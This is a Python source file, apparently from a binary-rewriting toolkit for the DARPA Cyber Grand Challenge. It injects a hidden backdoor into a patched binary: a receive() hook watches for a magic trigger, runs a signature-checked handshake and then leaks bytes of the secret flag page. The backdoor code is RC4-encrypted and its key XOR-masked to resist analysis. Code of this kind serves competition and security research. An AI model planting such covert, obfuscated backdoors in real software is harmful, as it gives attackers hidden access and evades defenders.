import os
import sys

from util import read
from util.crypto.rc4 import rc4
from util.patch.syscall import find_syscall_funcs

def backdoor(pt):
    c = read('backdoor/tweetnacl.c')
    c = c.replace('#include "tweetnacl.h"', '')
    h = read('backdoor/tweetnacl.h')
    pubkey = read('backdoor/pubkey.h')
    randombytes = r'''
    void randombytes(uint8_t *msg, uint64_t len) {
        syscall3(SYS_random, (uint32_t)msg, len, 0);
    }
    '''

    # TODO: transmit_all / receive_all?
    code = r'''
    #define NONCE_LEN 8
    #define SM_LEN 0x48
    void handshake() {
        uint8_t nonce[NONCE_LEN];
        syscall3(SYS_random, (uint32_t)nonce, NONCE_LEN, 0);
        syscall4(SYS_transmit, 1, (uint32_t)nonce, NONCE_LEN, 0);

        uint32_t smlen = SM_LEN;
        uint8_t *sm, *m;
        if (syscall3(SYS_allocate, smlen, 0, (uint32_t)&sm) ||
           (syscall3(SYS_allocate, smlen, 0, (uint32_t)&m))) {
            _terminate(1);
        }
        syscall4(SYS_receive, 0, (uint32_t)sm, smlen, 0);

        uint64_t mlen;
        int valid = crypto_sign_open(m, &mlen, sm, smlen, pubkey);
        if (valid == 0 && memcmp(m, nonce, NONCE_LEN) == 0) {
            syscall4(SYS_transmit, 1, 0x4347c000, 4, 0);
        }
        syscall1(SYS__terminate, 2);
    }
    '''

    code = h + pubkey + code + randombytes + c
    backdoor_addr, size = pt.inject(c=code, size=True)

    # rc4-encrypt the backdoor so you can't ROP directly into the type2 pov
    # this block also intercepts the receive() syscall function
    rc4_key = os.urandom(16)

    # as part of rc4-encrypting, we relocate the backdoor to the NX page so it doesn't add 1000+ ROP gadgets
    xor = rc4(rc4_key)
    data = pt.elf.read(backdoor_addr, size)
    for i in xrange(len(data)):
        data[i] ^= xor.next()
    shadow_addr = pt.inject(raw=data, target='nx', silent=True)
    pt.patch(backdoor_addr, raw=size * '\x00', silent=True)


    # xor key so they can't just pull it out of memory
    key_otp = os.urandom(len(rc4_key))
    key = ''.join([chr(ord(c) ^ ord(key_otp[i])) for i, c in enumerate(rc4_key)])
    str2c = lambda x: ', '.join(map(str, map(ord, x)))

    call_backdoor = r'''
    void call_backdoor() {
        void (*backdoor)() = (void (*)())%d;
        char *shadow_addr = (char *)%d;
        size_t bd_size = %d;
        memcpy(backdoor, shadow_addr, bd_size);

        uint8_t state[256];
        uint8_t rc4_key[] = {%s};
        uint8_t rc4_otp[] = {%s};
        int keylen = %d;
        for (int i = 0; i < keylen; i++) {
            rc4_key[i] ^= rc4_otp[i];
        }
        ksa(state, rc4_key, keylen);
        rc4(state, (uint8_t *)backdoor, bd_size);

        backdoor();
        // always exit after backdoor so there's not a decrypted type 2 POV in memory you can ROP into
        _terminate(0);
    }
    ''' % (backdoor_addr, shadow_addr, size, str2c(key), str2c(key_otp), len(key))

    receive_hook_head = r'''
    void call_backdoor();
    void check_init(char *buf, uint32_t size);
    int _receive(int fd, void *buf, uint32_t size, uint32_t *count);
    #define WINDOW 9
    char bufsave[WINDOW] = {1};
    uint32_t first = 1, saved = 1, pos = 1;
    int receive(int fd, void *_buf, uint32_t size, uint32_t *count) {
        char *buf = (char *)_buf;
        // shortcut if we've run and buffer is empty, or on fd > 0
        if (fd != 0 || saved == 0) {
            return _receive(fd, buf, size, count);
        } else if (first) {
            first = 0;
            if (size < WINDOW) {
                int ret = _receive(fd, bufsave, WINDOW, &saved);
                if (ret) return ret;
                check_init(bufsave, saved);
                pos = 0;
            } else {
                int ret = _receive(fd, buf, size, &saved);
                if (ret) return ret;
                if (count) *count = saved;
                check_init(buf, saved);
                saved = 0;
                return ret;
            }
        }
        // flush buffer
        if (saved > 0 && saved < size) {
            memcpy(buf, bufsave + pos, saved);
            if (count) *count = saved;
            uint32_t tmp;
            int ret = _receive(fd, buf + saved, size - saved, &tmp);
            saved = 0;
            if (ret) return ret;
            if (count) *count += tmp;
            return ret;
        } else if (saved >= size) {
            memcpy(buf, bufsave + pos, size);
            if (count) *count = size;
            saved -= size;
            pos += size;
        }
        return 0;
    }'''
    receive_hook_tail = r'''
    void check_init(char *buf, uint32_t size) {
        if (size < 5) return;
        char hash[4];
        for (int i = 0; i < 4; i++) hash[i] = buf[i];
        char *key = "ECAF";
        for (int i = 4; i < size; i++) {
            for (int j = 0; j < 4; j++) {
                hash[j] ^= buf[i];
            }
            if (*(uint32_t *)hash == *(uint32_t *)key) {
                size = i + 1;
                // respond with inverted key so POV can seek ahead to handshake
                for (int j = 0; j < size; j++) {
                    buf[j] ^= 0xff;
                }
                transmit(1, buf, size, 0);
                call_backdoor();
            }
        }
    }
    ''' + call_backdoor

    def patch_receive(code, syms):
        if syms == ['receive']:
            out = []
            # TODO: this is really gross text parsing
            out.append(receive_hook_head)
            for line in code.split('\n'):
                if line.startswith('int receive(') and line.endswith('{'):
                    out.append(line.replace('int receive(', 'int _receive(', 1))
                else:
                    out.append(line)
            out.append(receive_hook_tail)
            return '\n'.join(out)

    pt.binary.linker.onpre(patch_receive)
